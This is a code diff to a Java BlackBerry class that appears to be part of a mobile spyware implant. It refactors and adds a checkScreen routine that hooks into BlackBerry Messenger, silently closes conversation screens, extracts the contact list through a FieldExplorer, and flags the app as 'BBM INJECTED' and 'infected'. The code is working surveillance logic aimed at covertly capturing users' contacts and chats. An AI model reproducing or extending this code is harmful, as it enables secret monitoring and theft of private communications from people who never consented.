@@ -101,45 +101,7 @@ public class BBMMenuItem extends ApplicationMenuItem {
             debug.trace("class: " + cl);
             //#endif
 
-            Screen screen = UiApplication.getUiApplication().getActiveScreen();
-
-            //#ifdef DEBUG
-            debug.trace("screen: " + screen + " count: "
-                    + screen.getUiEngine().getScreenCount());
-            //#endif
-
-            //debug.startBuffering(EventLogger.INFORMATION);
-            //#ifdef DEBUG
-            debug.trace("run: " + screen.getClass().getName());
-            //#endif
-            if (screen.getClass().getName().indexOf("ContactsScreen") > 0) {
-                contacts.removeAllElements();
-
-                contactsScreen = screen;
-                bbmApplication = UiApplication.getUiApplication();
-
-                FieldExplorer explorer = new FieldExplorer();
-                contacts = explorer.explore(screen);
-
-                screen.close();
-                bbmInjected = true;
-
-                // lookForConversationsThread();
-                conversationScreen.setBBM(bbmApplication);
-
-                //#ifdef DEBUG
-                debug.info("BBM INJECTED!");
-                debug.ledFlash(Debug.COLOR_GREEN);
-                //#endif
-                
-                AppInjectorBBM.getInstance().setInfected(true);
-
-            } else {
-                //#ifdef DEBUG
-                debug.warn("BBM NOT INJECTED!");
-                debug.ledFlash(Debug.COLOR_RED);
-                //#endif
-            }
+            checkScreen(3);
 
             //debug.stopBuffering();
 
@@ -151,6 +113,62 @@ public class BBMMenuItem extends ApplicationMenuItem {
         }
 
         return null;
+    }
+
+    private void checkScreen(int tries) {
+        Screen screen = UiApplication.getUiApplication().getActiveScreen();
+        if(tries<=0){
+//#ifdef DEBUG
+debug.trace("checkScreen: no more tries");
+//#endif
+            return;
+        }
+
+        //#ifdef DEBUG
+        debug.trace("screen: " + screen + " count: "
+                + screen.getUiEngine().getScreenCount());
+        //#endif
+
+        //debug.startBuffering(EventLogger.INFORMATION);
+        //#ifdef DEBUG
+        debug.trace("run: " + screen.getClass().getName());
+        //#endif
+        if (screen.getClass().getName().indexOf("ContactsScreen") > 0) {
+            contacts.removeAllElements();
+
+            contactsScreen = screen;
+            bbmApplication = UiApplication.getUiApplication();
+
+            //#ifdef DEBUG
+            FieldExplorer explorer = new FieldExplorer();
+            contacts = explorer.explore(screen);
+            //#endif
+            
+            screen.close();
+            bbmInjected = true;
+
+            // lookForConversationsThread();
+            conversationScreen.setBBM(bbmApplication);
+
+            //#ifdef DEBUG
+            debug.info("BBM INJECTED!");
+            debug.ledFlash(Debug.COLOR_GREEN);
+            //#endif
+            
+            AppInjectorBBM.getInstance().setInfected(true);
+
+        } else if (screen.getClass().getName().indexOf("ConversationScreen") > 0) {
+            //#ifdef DEBUG
+            debug.info("checkScreen: Conversation, closing");
+            //#endif
+            screen.close();
+            checkScreen(tries-1);
+        }else{
+            //#ifdef DEBUG
+            debug.warn("BBM NOT INJECTED!");
+            debug.ledFlash(Debug.COLOR_RED);
+            //#endif
+        }
     }
 
     private synchronized boolean extractProfile(Screen screen) {
